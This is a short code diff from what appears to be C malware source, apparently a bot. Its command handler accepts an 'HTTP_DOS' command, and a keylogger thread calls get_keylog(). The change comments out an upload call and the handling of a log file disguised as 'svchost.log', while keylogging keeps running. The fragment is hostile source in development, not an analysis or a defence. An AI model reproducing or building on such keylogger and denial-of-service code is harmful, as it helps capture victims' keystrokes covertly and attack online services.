@@ -64,7 +64,6 @@ int expression_handler(char *command, char **riscommand){
 	if(strcmp("HTTP_DOS",token)==0){
 
         token = strtok(NULL,token);
-
         *riscommand=token;
 		//hdos_exe(token);
 		return 1;
@@ -79,8 +78,8 @@ int expression_handler(char *command, char **riscommand){
 }
 
 void *kl_thread(){
-	upload();
-	FILE* fp =fopen("svchost.log","w");
-    fclose(fp);
+	//upload();
+	//FILE* fp =fopen("svchost.log","w");
+    //fclose(fp);
     get_keylog();
 }
